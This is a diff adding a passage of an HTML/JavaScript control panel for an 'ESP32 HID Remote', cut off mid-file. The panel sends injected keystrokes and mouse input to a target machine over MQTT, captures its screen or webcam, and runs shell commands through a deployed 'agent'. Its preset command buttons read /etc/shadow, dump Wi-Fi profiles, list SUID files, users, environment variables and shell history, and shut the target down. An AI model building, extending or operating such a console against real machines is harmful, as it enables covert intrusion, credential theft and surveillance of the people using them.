@@ -1,0 +1,1625 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>ESP32 HID Remote</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/5.12.1/mqtt.min.js"></script>
+<style>
+:root {
+  --bg:       #0a0a0f;
+  --bg2:      #111118;
+  --bg3:      #181820;
+  --border:   #1e2830;
+  --fg:       #c8d8c8;
+  --fg2:      #7a9a7a;
+  --green:    #00e676;
+  --blue:     #40c4ff;
+  --amber:    #ffab00;
+  --red:      #ff5252;
+  --accent:   #00e676;
+  color-scheme: dark;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body { height: 100%; }
+
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: 'JetBrains Mono', 'Courier New', monospace;
+  font-size: 13px;
+  line-height: 1.5;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 16px;
+  overflow-x: hidden;
+}
+
+/* ── header ── */
+.header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-bottom: 16px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+.logo {
+  font-size: 1.1em;
+  font-weight: 700;
+  color: var(--green);
+  letter-spacing: 0.05em;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.logo .dot {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--red);
+  box-shadow: 0 0 6px var(--red);
+  flex-shrink: 0;
+  transition: background 0.3s, box-shadow 0.3s;
+}
+.logo .dot.on  { background: var(--green); box-shadow: 0 0 8px var(--green); }
+.logo .dot.mid { background: var(--amber); box-shadow: 0 0 6px var(--amber); }
+
+.status-line {
+  font-size: .75em;
+  color: var(--fg2);
+  display: flex;
+  gap: 12px;
+  flex-wrap: wrap;
+}
+
+.badge {
+  padding: 3px 9px;
+  border-radius: 12px;
+  border: 1px solid var(--border);
+  font-size: .75em;
+  white-space: nowrap;
+}
+.badge.green { border-color: var(--green); color: var(--green); }
+.badge.red   { border-color: var(--red);   color: var(--red); }
+.badge.amber { border-color: var(--amber); color: var(--amber); }
+
+/* ── topic bar ── */
+.topic-bar {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 14px;
+  align-items: center;
+  flex-wrap: wrap;
+}
+
+.topic-bar label { color: var(--fg2); font-size: .75em; white-space: nowrap; }
+
+.topic-bar input {
+  flex: 1;
+  min-width: 180px;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 7px 10px;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: .85em;
+}
+.topic-bar input:focus { outline: none; border-color: var(--green); }
+
+/* ── layout: 2-col on wide, 1-col on mobile ── */
+.main {
+  display: grid;
+  grid-template-columns: 1fr minmax(0, 320px);
+  gap: 14px;
+  align-items: start;
+}
+@media (max-width: 720px) {
+  .main { grid-template-columns: 1fr; }
+}
+
+/* ── card ── */
+.card {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 14px;
+  margin-bottom: 12px;
+}
+
+.card-title {
+  font-size: .7em;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: .1em;
+  color: var(--fg2);
+  margin-bottom: 10px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+
+/* ── type text ── */
+.type-row {
+  display: flex;
+  gap: 6px;
+}
+
+.type-row input {
+  flex: 1;
+  min-width: 0;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 9px 12px;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: .9em;
+}
+.type-row input:focus { outline: none; border-color: var(--green); }
+.type-row input::placeholder { color: var(--fg2); }
+
+/* ── buttons ── */
+.btn {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 8px 14px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: .85em;
+  white-space: nowrap;
+  transition: background .1s, border-color .1s, color .1s;
+  -webkit-tap-highlight-color: transparent;
+}
+.btn:hover  { background: var(--bg3); border-color: var(--green); color: var(--green); }
+.btn:active { background: var(--green); border-color: var(--green); color: var(--bg); }
+
+.btn-primary {
+  background: var(--green);
+  border-color: var(--green);
+  color: var(--bg);
+  font-weight: 700;
+}
+.btn-primary:hover  { background: #00c853; border-color: #00c853; color: var(--bg); }
+.btn-primary:active { background: #00b248; }
+
+/* ── key grid ── */
+.key-grid {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 5px;
+}
+@media (max-width: 400px) {
+  .key-grid { grid-template-columns: repeat(3, 1fr); }
+}
+
+.kbtn {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 9px 4px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-family: inherit;
+  font-size: .78em;
+  text-align: center;
+  line-height: 1.2;
+  -webkit-tap-highlight-color: transparent;
+  user-select: none;
+  transition: background .08s, border-color .08s, color .08s;
+}
+.kbtn:hover  { border-color: var(--green); color: var(--green); }
+.kbtn:active { background: var(--green); border-color: var(--green); color: var(--bg); }
+
+.kbtn.wide { grid-column: span 2; }
+
+/* ── mouse pad ── */
+.mousepad {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 5px;
+}
+
+.pad-center { grid-column: 2; }
+.pad-row { display: flex; gap: 5px; margin-top: 5px; }
+.pad-row .kbtn { flex: 1; }
+
+/* ── text macro ── */
+.macro-list {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+
+.macro-row {
+  display: flex;
+  gap: 5px;
+  align-items: stretch;
+}
+
+.macro-input {
+  flex: 1;
+  min-width: 0;
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 7px 10px;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: .82em;
+}
+.macro-input:focus { outline: none; border-color: var(--green); }
+.macro-input::placeholder { color: var(--fg2); }
+
+/* ── log panel ── */
+.log-panel {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 12px;
+  height: 100%;
+}
+
+.log-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+
+.log-title {
+  font-size: .7em;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: .1em;
+  color: var(--fg2);
+}
+
+.log-clear { font-size: .7em; color: var(--fg2); cursor: pointer; }
+.log-clear:hover { color: var(--fg); }
+
+.log-body {
+  height: 260px;
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border) transparent;
+}
+
+@media (max-width: 720px) {
+  .log-body { height: 160px; }
+}
+
+.log-entry {
+  font-size: .72em;
+  padding: 2px 0;
+  display: flex;
+  gap: 8px;
+  border-bottom: 1px solid #111;
+}
+
+.log-ts { color: var(--fg2); flex-shrink: 0; }
+.log-ok   .log-msg { color: var(--green); }
+.log-err  .log-msg { color: var(--red); }
+.log-info .log-msg { color: var(--blue); }
+.log-warn .log-msg { color: var(--amber); }
+
+/* ── tabs ── */
+.tabs {
+  display: flex;
+  gap: 2px;
+  margin-bottom: 14px;
+  border-bottom: 1px solid var(--border);
+}
+
+.tab {
+  padding: 8px 18px;
+  font-size: .78em;
+  font-weight: 600;
+  letter-spacing: .06em;
+  text-transform: uppercase;
+  color: var(--fg2);
+  cursor: pointer;
+  border-bottom: 2px solid transparent;
+  margin-bottom: -1px;
+  transition: color .15s, border-color .15s;
+  user-select: none;
+}
+.tab:hover  { color: var(--fg); }
+.tab.active { color: var(--green); border-bottom-color: var(--green); }
+
+.tab-panel { display: none; }
+.tab-panel.active { display: block; }
+
+/* ── screen view ── */
+.screen-toolbar {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  flex-wrap: wrap;
+  margin-bottom: 10px;
+}
+
+.screen-toolbar label { color: var(--fg2); font-size: .78em; }
+
+select {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  color: var(--fg);
+  padding: 7px 10px;
+  border-radius: 4px;
+  font-family: inherit;
+  font-size: .82em;
+}
+select:focus { outline: none; border-color: var(--green); }
+
+.screen-box {
+  position: relative;
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  overflow: hidden;
+  min-height: 200px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.screen-box img {
+  width: 100%;
+  display: block;
+  image-rendering: auto;
+}
+
+.screen-empty {
+  color: var(--fg2);
+  font-size: .85em;
+  text-align: center;
+  padding: 40px 20px;
+}
+
+.screen-ts {
+  font-size: .7em;
+  color: var(--fg2);
+  margin-top: 6px;
+  text-align: right;
+}
+
+.screen-box .screen-spinner {
+  position: absolute;
+  inset: 0;
+  background: rgba(0,0,0,.6);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: .8em;
+  color: var(--green);
+}
+.screen-box .screen-spinner[hidden] { display: none; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">
+    <div class="dot" id="mqttDot"></div>
+    ESP32 HID Remote
+  </div>
+  <div class="status-line">
+    <span class="badge red" id="badgeMqtt">MQTT: connecting…</span>
+    <span class="badge" id="badgeEsp">ESP32: unknown</span>
+    <span class="badge" id="badgeTarget" style="display:none;">TARGET: –</span>
+  </div>
+</div>
+
+<div class="topic-bar">
+  <label>Device topic:</label>
+  <input id="topicInput" placeholder="esp32hid/XXXXXX" spellcheck="false">
+  <button class="btn" onclick="reconnect()">Connect</button>
+</div>
+
+<div class="tabs">
+  <div class="tab active" onclick="switchTab('controls')">Controls</div>
+  <div class="tab" onclick="switchTab('screen')">Screen</div>
+  <div class="tab" onclick="switchTab('shell')">Shell</div>
+</div>
+
+<!-- ── Controls tab ── -->
+<div class="tab-panel active" id="tab-controls">
+<div class="main">
+
+  <!-- left: controls -->
+  <div>
+
+    <!-- type text -->
+    <div class="card">
+      <div class="card-title">Type Text</div>
+      <div class="type-row">
+        <input id="typeText" placeholder="Text to send to target…" autocomplete="off" spellcheck="false"
+               onkeydown="if(event.key==='Enter'){sendType();event.preventDefault();}">
+        <button class="btn btn-primary" onclick="sendType()">Send</button>
+      </div>
+    </div>
+
+    <!-- keyboard shortcuts -->
+    <div class="card">
+      <div class="card-title">Keyboard</div>
+      <div class="key-grid">
+        <div class="kbtn wide" onclick="key('ENTER')">⏎ Enter</div>
+        <div class="kbtn" onclick="key('ESC')">Esc</div>
+        <div class="kbtn" onclick="key('TAB')">Tab</div>
+        <div class="kbtn" onclick="key('BACKSPACE')">⌫ Bksp</div>
+        <div class="kbtn" onclick="key('DEL')">Del</div>
+        <div class="kbtn" onclick="key('HOME')">Home</div>
+        <div class="kbtn" onclick="key('END')">End</div>
+        <div class="kbtn" onclick="key('UP')">▲</div>
+        <div class="kbtn" onclick="key('DOWN')">▼</div>
+        <div class="kbtn" onclick="key('LEFT')">◀</div>
+        <div class="kbtn" onclick="key('RIGHT')">▶</div>
+        <div class="kbtn" onclick="combo(['WIN'],'R')">Win+R</div>
+        <div class="kbtn" onclick="combo(['WIN'],'E')">Win+E</div>
+        <div class="kbtn" onclick="combo(['CTRL'],'C')">Ctrl+C</div>
+        <div class="kbtn" onclick="combo(['CTRL'],'V')">Ctrl+V</div>
+        <div class="kbtn" onclick="combo(['CTRL'],'A')">Ctrl+A</div>
+        <div class="kbtn" onclick="combo(['CTRL'],'Z')">Ctrl+Z</div>
+        <div class="kbtn" onclick="combo(['CTRL'],'X')">Ctrl+X</div>
+        <div class="kbtn" onclick="combo(['CTRL','SHIFT'],'ESC')">T.Mgr</div>
+        <div class="kbtn" onclick="combo(['ALT'],'F4')">Alt+F4</div>
+        <div class="kbtn" onclick="combo(['WIN'],'L')">Win+L</div>
+        <div class="kbtn" onclick="combo(['CTRL','ALT'],'DELETE')">C+A+Del</div>
+        <div class="kbtn" onclick="combo(['WIN'],'X')">Win+X</div>
+        <div class="kbtn" onclick="key('F5')">F5</div>
+        <div class="kbtn" onclick="key('PRINTSCR')">PrtSc</div>
+      </div>
+    </div>
+
+    <!-- mouse -->
+    <div class="card">
+      <div class="card-title">Mouse</div>
+      <div class="mousepad">
+        <div></div>
+        <div class="kbtn pad-center" onclick="mouseMove(0,-60)">▲▲</div>
+        <div></div>
+        <div class="kbtn" onclick="mouseMove(-60,0)">◀◀</div>
+        <div class="kbtn" onclick="mouseMove(0,0)" style="opacity:.3">·</div>
+        <div class="kbtn" onclick="mouseMove(60,0)">▶▶</div>
+        <div></div>
+        <div class="kbtn pad-center" onclick="mouseMove(0,60)">▼▼</div>
+        <div></div>
+      </div>
+      <div class="pad-row">
+        <div class="kbtn" onclick="mouseClick('L')">Left Click</div>
+        <div class="kbtn" onclick="mouseClick('R')">Right Click</div>
+        <div class="kbtn" onclick="mouseScroll(-3)">Scroll ▲</div>
+        <div class="kbtn" onclick="mouseScroll(3)">Scroll ▼</div>
+      </div>
+    </div>
+
+    <!-- macros -->
+    <div class="card">
+      <div class="card-title">Saved Macros</div>
+      <div class="macro-list" id="macroList"></div>
+      <div style="margin-top:8px; display:flex; gap:6px;">
+        <input class="macro-input" id="newMacro" placeholder="New macro text… (Enter to save)" style="flex:1"
+               onkeydown="if(event.key==='Enter'){addMacro();event.preventDefault();}">
+        <button class="btn" onclick="addMacro()">+ Add</button>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- right: log -->
+  <div>
+    <div class="log-panel">
+      <div class="log-header">
+        <span class="log-title">Command Log</span>
+        <span class="log-clear" onclick="clearLog()">Clear</span>
+      </div>
+      <div class="log-body" id="logBody"></div>
+    </div>
+  </div>
+
+</div>
+</div><!-- end tab-controls -->
+
+<!-- ── Screen tab ── -->
+<div class="tab-panel" id="tab-screen">
+
+  <!-- OS / mode selector row -->
+  <div class="screen-toolbar">
+    <label style="color:var(--fg2);font-size:.78em;">Target OS:</label>
+    <select id="osSelect" onchange="onOsChange()" style="min-width:130px;">
+      <option value="auto"    selected>⚡ Auto-detect</option>
+      <option value="windows">🪟 Windows</option>
+      <option value="linux">🐧 Linux / Kali</option>
+      <option value="macos">🍎 macOS</option>
+      <option value="camera">📷 IP Camera</option>
+    </select>
+
+    <!-- Capture / Live buttons (hidden for camera mode) -->
+    <div id="captureButtons" style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+      <button class="btn btn-primary" id="btnCapture" onclick="captureNow()">Capture</button>
+      <button class="btn" id="btnLive" onclick="toggleLive()" style="min-width:80px;">▶ Live</button>
+      <span id="captureStatus" style="color:var(--fg2);font-size:.75em;white-space:nowrap;"></span>
+    </div>
+  </div>
+
+  <!-- Auto-detect progress (shown only during auto) -->
+  <div id="autoProgress" hidden style="font-size:.75em;color:var(--amber);margin-bottom:8px;padding:6px 10px;background:var(--bg2);border:1px solid var(--border);border-radius:4px;"></div>
+
+  <!-- Screenshot view (default) -->
+  <div id="screenshotView">
+    <div class="screen-box" id="screenBox">
+      <div class="screen-empty" id="screenEmpty">
+        No screenshot yet — select a target OS and click <strong>Capture</strong>.
+      </div>
+      <img id="screenImg" hidden alt="Target screen" style="cursor:zoom-in;" onclick="toggleFullscreen(this)">
+      <div class="screen-spinner" id="screenSpinner" hidden>Waiting for screenshot…</div>
+    </div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:5px;">
+      <span class="screen-ts" id="screenTs"></span>
+      <span style="font-size:.7em;color:var(--fg2);" id="frameCounter"></span>
+    </div>
+  </div>
+
+  <!-- IP Camera / HDMI view -->
+  <div id="cameraView" hidden>
+    <!-- Source selector -->
+    <div style="display:flex;gap:8px;align-items:center;margin-bottom:10px;flex-wrap:wrap;">
+      <label style="color:var(--fg2);font-size:.78em;">Source:</label>
+      <select id="camSource" onchange="onCamSourceChange()" style="min-width:140px;">
+        <option value="url">📡 MJPEG / IP Camera</option>
+        <option value="hdmi">🖥 HDMI Capture Card</option>
+      </select>
+    </div>
+
+    <!-- MJPEG URL config -->
+    <div id="urlConfig">
+      <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;">
+        <input id="camUrl" placeholder="http://192.168.x.x:8080/video"
+               style="flex:1;min-width:200px;background:var(--bg2);border:1px solid var(--border);color:var(--fg);
+                      padding:8px 10px;border-radius:4px;font-family:inherit;font-size:.82em;"
+               onkeydown="if(event.key==='Enter')setCameraUrl()">
+        <button class="btn btn-primary" onclick="setCameraUrl()">Set &amp; Stream</button>
+        <button class="btn" onclick="camSnap()">Snapshot</button>
+      </div>
+      <div style="font-size:.72em;color:var(--fg2);margin-bottom:10px;line-height:1.8;">
+        Stream is <strong>proxied through the Pi</strong> — works from anywhere.<br>
+        <strong>Android IP Webcam:</strong> <code>http://PHONE-IP:8080/video</code> &nbsp;|&nbsp;
+        <strong>ESP32-CAM:</strong> <code>http://CAM-IP:81/stream</code>
+      </div>
+    </div>
+
+    <!-- HDMI capture config -->
+    <div id="hdmiConfig" hidden>
+      <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap;align-items:center;">
+        <input id="hdmiDevice" value="/dev/video0" placeholder="/dev/video0"
+               style="background:var(--bg2);border:1px solid var(--border);color:var(--fg);
+                      padding:7px 10px;border-radius:4px;font-family:inherit;font-size:.82em;width:140px;">
+        <select id="hdmiRes">
+          <option value="1280x720" selected>1280×720 HD</option>
+          <option value="1920x1080">1920×1080 FHD</option>
+          <option value="640x480">640×480</option>
+        </select>
+        <select id="hdmiFps">
+          <option value="10" selected>10 fps</option>
+          <option value="15">15 fps</option>
+          <option value="5">5 fps</option>
+          <option value="25">25 fps</option>
+        </select>
+        <button class="btn btn-primary" id="btnHdmiStart" onclick="startHdmiStream()">▶ Start</button>
+        <button class="btn" id="btnHdmiStop" hidden onclick="stopHdmiStream()"
+                style="border-color:var(--red);color:var(--red);">■ Stop</button>
+      </div>
+      <div id="hdmiDeviceList" style="font-size:.72em;color:var(--fg2);margin-bottom:8px;line-height:1.8;"></div>
+      <div style="font-size:.72em;color:var(--fg2);margin-bottom:8px;line-height:1.8;">
+        <strong>Requires:</strong> USB HDMI capture card on Pi, <code>sudo apt install ffmpeg v4l-utils</code><br>
+        <strong>List devices:</strong> <code>v4l2-ctl --list-devices</code> &nbsp;|&nbsp; <code>ls /dev/video*</code>
+      </div>
+    </div>
+
+    <div class="screen-box" id="camBox" style="min-height:240px;">
+      <div class="screen-empty" id="camEmpty">Select a source above and start streaming.</div>
+      <img id="camImg" hidden alt="Camera feed" style="width:100%;">
+    </div>
+    <div style="font-size:.7em;color:var(--fg2);margin-top:5px;" id="camStatus"></div>
+  </div>
+
+  <!-- OS-specific hints -->
+  <div class="card" style="margin-top:12px;" id="osHintCard">
+    <div class="card-title" id="osHintTitle">How capture works</div>
+    <div style="font-size:.75em;color:var(--fg2);line-height:1.9;" id="osHintBody"></div>
+  </div>
+
+</div><!-- end tab-screen -->
+
+<!-- ── Shell tab ── -->
+<div class="tab-panel" id="tab-shell">
+
+  <!-- Device info banner -->
+  <div id="deviceBanner" class="card" style="display:none;margin-bottom:10px;border-color:var(--green);padding:10px 14px;">
+    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+      <span style="color:var(--green);font-size:.85em;font-weight:700;">● AGENT CONNECTED</span>
+      <span id="devHost" style="color:var(--fg);font-size:.82em;"></span>
+      <span id="devOs"   style="color:var(--blue);font-size:.75em;"></span>
+      <span id="devUser" style="color:var(--amber);font-size:.75em;"></span>
+      <span id="devIp"   style="color:var(--fg2);font-size:.75em;"></span>
+      <span id="devArch" style="color:var(--fg2);font-size:.72em;"></span>
+      <span id="devAgo"  style="color:var(--fg2);font-size:.7em;margin-left:auto;"></span>
+    </div>
+  </div>
+  <div id="deviceBannerOff" class="card" style="margin-bottom:10px;border-color:var(--border);padding:10px 14px;">
+    <span style="color:var(--fg2);font-size:.78em;">No agent connected — launch a shell command to deploy the agent to the target device.</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Shell Command Execution</div>
+    <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px;">
+      <label style="color:var(--fg2);font-size:.78em;">Target OS:</label>
+      <select id="shellOsSelect" onchange="onShellOsChange()" style="min-width:130px;">
+        <option value="windows">🪟 Windows</option>
+        <option value="linux">🐧 Linux / Kali</option>
+        <option value="macos">🍎 macOS</option>
+        <option value="camera">📷 Camera / HDMI</option>
+      </select>
+      <span id="shellPollStatus" style="color:var(--fg2);font-size:.75em;margin-left:4px;"></span>
+    </div>
+
+    <!-- Quick commands -->
+    <div style="margin-bottom:10px;">
+      <div style="font-size:.7em;font-weight:700;text-transform:uppercase;letter-spacing:.1em;color:var(--fg2);margin-bottom:6px;">Quick Commands</div>
+
+      <div id="quickWin" style="display:grid;grid-template-columns:repeat(3,1fr);gap:5px;">
+        <div class="kbtn" onclick="runCmd('whoami')">whoami</div>
+        <div class="kbtn" onclick="runCmd('ipconfig /all')">ipconfig</div>
+        <div class="kbtn" onclick="runCmd('netstat -an')">netstat</div>
+        <div class="kbtn" onclick="runCmd('tasklist')">tasklist</div>
+        <div class="kbtn" onclick="runCmd('systeminfo')">systeminfo</div>
+        <div class="kbtn" onclick="runCmd('net user')">net user</div>
+        <div class="kbtn" onclick="runCmd('dir C:\\')">dir C:\</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-Process|select Name,Id,CPU|sort CPU -desc|select -first 20')">top procs</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-NetIPAddress|select IPAddress,InterfaceAlias')">IP addrs</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-LocalUser|select Name,Enabled,LastLogon')">local users</div>
+        <div class="kbtn" onclick="runCmd('powershell ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)')">admin?</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-WmiObject Win32_ComputerSystem|select Name,Domain,TotalPhysicalMemory')">sys info</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-NetFirewallProfile|select Name,Enabled')">firewall</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-ChildItem Env:|sort Name')">env vars</div>
+        <div class="kbtn" onclick="runCmd('powershell netsh wlan show profiles')">wifi profs</div>
+        <div class="kbtn" style="border-color:var(--red);color:var(--red);"
+             onclick="runCmd('shutdown /s /t 5')">shutdown</div>
+        <div class="kbtn" style="border-color:var(--amber);color:var(--amber);"
+             onclick="runCmd('shutdown /r /t 5')">restart</div>
+        <div class="kbtn" onclick="runCmd('shutdown /a')">abort shutdown</div>
+        <!-- camera separator -->
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);margin-top:3px;letter-spacing:.05em;">📷 CAMERA / WEBCAM</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-PnpDevice -Class Camera | Select FriendlyName,Status')">list cameras</div>
+        <div class="kbtn" onclick="runCmd('start microsoft.windows.camera:')">open camera</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-PnpDevice -Class Image | Select FriendlyName,Status')">image devices</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-WmiObject Win32_VideoController | Select Name,Status,CurrentHorizontalResolution,CurrentVerticalResolution')">video cards</div>
+        <div class="kbtn" onclick="runCmd('powershell Get-AppxPackage | Where-Object Name -like *camera* | Select Name,Version')">camera apps</div>
+        <div class="kbtn" onclick="runCmd('reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam /s 2>nul')">cam privacy</div>
+      </div>
+
+      <div id="quickLinux" style="display:none;grid-template-columns:repeat(3,1fr);gap:5px;">
+        <div class="kbtn" onclick="runCmd('whoami && id')">whoami/id</div>
+        <div class="kbtn" onclick="runCmd('ip a')">ip addr</div>
+        <div class="kbtn" onclick="runCmd('ss -tlnp')">ports</div>
+        <div class="kbtn" onclick="runCmd('ps aux --sort=-%cpu | head -20')">top procs</div>
+        <div class="kbtn" onclick="runCmd('ls -la ~')">home dir</div>
+        <div class="kbtn" onclick="runCmd('uname -a && cat /etc/os-release')">os info</div>
+        <div class="kbtn" onclick="runCmd('df -h')">disk</div>
+        <div class="kbtn" onclick="runCmd('free -h')">memory</div>
+        <div class="kbtn" onclick="runCmd('cat /etc/passwd | grep -v nologin')">users</div>
+        <div class="kbtn" onclick="runCmd('sudo cat /etc/shadow 2>&1 | head -20')">shadow</div>
+        <div class="kbtn" onclick="runCmd('last -n 20')">last logins</div>
+        <div class="kbtn" onclick="runCmd('env')">env vars</div>
+        <div class="kbtn" onclick="runCmd('sudo iptables -L -n')">iptables</div>
+        <div class="kbtn" onclick="runCmd('find / -perm -u=s -type f 2>/dev/null | head -20')">suid files</div>
+        <div class="kbtn" onclick="runCmd('crontab -l && cat /etc/crontab')">crontab</div>
+        <div class="kbtn" style="border-color:var(--red);color:var(--red);"
+             onclick="runCmd('sudo shutdown -h now')">shutdown</div>
+        <div class="kbtn" style="border-color:var(--amber);color:var(--amber);"
+             onclick="runCmd('sudo reboot')">reboot</div>
+        <div class="kbtn" onclick="runCmd('history | tail -30')">history</div>
+        <!-- camera separator -->
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);margin-top:3px;letter-spacing:.05em;">📷 CAMERA / V4L2</div>
+        <div class="kbtn" onclick="runCmd('ls /dev/video* && lsusb | grep -i &quot;camera\\|capture\\|video&quot;')">list devices</div>
+        <div class="kbtn" onclick="runCmd('v4l2-ctl --list-devices 2>/dev/null || echo &quot;install: apt install v4l-utils&quot;')">v4l2 devices</div>
+        <div class="kbtn" onclick="runCmd('v4l2-ctl -d /dev/video0 --all 2>/dev/null | head -40')">device info</div>
+        <div class="kbtn" onclick="runCmd('ffmpeg -f v4l2 -list_formats all -i /dev/video0 2>&1 | head -20')">list formats</div>
+        <div class="kbtn" onclick="runCmd('ffmpeg -f v4l2 -frames:v 1 -i /dev/video0 /tmp/test.jpg -y 2>&1 | tail -5 && echo saved')">test capture</div>
+        <div class="kbtn" onclick="runCmd('ffplay -f v4l2 -i /dev/video0 2>/dev/null &amp; echo started')">preview cam</div>
+      </div>
+
+      <div id="quickMac" style="display:none;grid-template-columns:repeat(3,1fr);gap:5px;">
+        <div class="kbtn" onclick="runCmd('whoami && id')">whoami/id</div>
+        <div class="kbtn" onclick="runCmd('ifconfig | grep inet')">ifconfig</div>
+        <div class="kbtn" onclick="runCmd('netstat -an | grep LISTEN')">ports</div>
+        <div class="kbtn" onclick="runCmd('ps aux | sort -rk 3 | head -20')">top procs</div>
+        <div class="kbtn" onclick="runCmd('ls -la ~')">home dir</div>
+        <div class="kbtn" onclick="runCmd('sw_vers && uname -a')">os info</div>
+        <div class="kbtn" onclick="runCmd('df -h')">disk</div>
+        <div class="kbtn" onclick="runCmd('vm_stat | head -10')">memory</div>
+        <div class="kbtn" onclick="runCmd('dscl . -list /Users | grep -v ^_')">users</div>
+        <div class="kbtn" onclick="runCmd('sudo dscacheutil -flushcache && last | head -20')">last logins</div>
+        <div class="kbtn" onclick="runCmd('env')">env vars</div>
+        <div class="kbtn" onclick="runCmd('system_profiler SPNetworkDataType 2>/dev/null | head -40')">network</div>
+        <div class="kbtn" onclick="runCmd('launchctl list | head -20')">launchctl</div>
+        <div class="kbtn" onclick="runCmd('cat /etc/hosts')">hosts file</div>
+        <div class="kbtn" onclick="runCmd('history | tail -30')">history</div>
+        <div class="kbtn" style="border-color:var(--red);color:var(--red);"
+             onclick="runCmd('sudo shutdown -h now')">shutdown</div>
+        <div class="kbtn" style="border-color:var(--amber);color:var(--amber);"
+             onclick="runCmd('sudo shutdown -r now')">reboot</div>
+        <div class="kbtn" onclick="runCmd('sudo spctl --status')">gatekeeper</div>
+        <!-- camera separator -->
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:5px 0 2px;border-top:1px solid var(--border);margin-top:3px;letter-spacing:.05em;">📷 CAMERA</div>
+        <div class="kbtn" onclick="runCmd('system_profiler SPCameraDataType')">list cameras</div>
+        <div class="kbtn" onclick="runCmd('open -a FaceTime')">FaceTime</div>
+        <div class="kbtn" onclick="runCmd('open -a Photo\\ Booth')">Photo Booth</div>
+        <div class="kbtn" onclick="runCmd('ffmpeg -f avfoundation -list_devices true -i x 2>&1 | head -20')">AV devices</div>
+        <div class="kbtn" onclick="runCmd('ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i 0 -frames:v 1 /tmp/cam.jpg -y 2>&1 | tail -3')">capture frame</div>
+        <div class="kbtn" onclick="runCmd('ioreg -p IOUSB | grep -i camera')">USB cam info</div>
+      </div>
+
+      <!-- Camera / HDMI dedicated grid (Linux shell on target) -->
+      <div id="quickCamera" style="display:none;grid-template-columns:repeat(3,1fr);gap:5px;">
+
+        <div style="grid-column:span 3;font-size:.65em;color:var(--fg2);padding:2px 0 4px;letter-spacing:.05em;">🔍 DETECT DEVICES</div>
+        <!-- detect: find all video devices and show which ones are real capture devices -->
+        <div class="kbtn" style="grid-column:span 2"
+             onclick="runCmd('for d in /dev/video*; do echo -n &quot;$d: &quot;; v4l2-ctl -d $d --info 2>/dev/null | grep -m1 &quot;Card type&quot; || echo unknown; done')">find capture cards</div>
